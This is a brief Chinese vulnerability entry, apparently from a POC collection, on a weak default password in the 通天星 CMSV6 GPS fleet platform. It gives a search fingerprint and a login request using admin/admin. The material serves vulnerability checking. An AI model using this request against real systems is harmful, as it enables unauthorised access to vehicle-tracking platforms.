﻿# 通天星CMSV6弱口令漏洞

> 更新时间：2024-04-07

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：body="/808gps/"

> 验证脚本：HTTP

```
GET /StandardApiAction_login.action?account=admin&password=admin HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：通天星CMSV6弱口令漏洞.poc

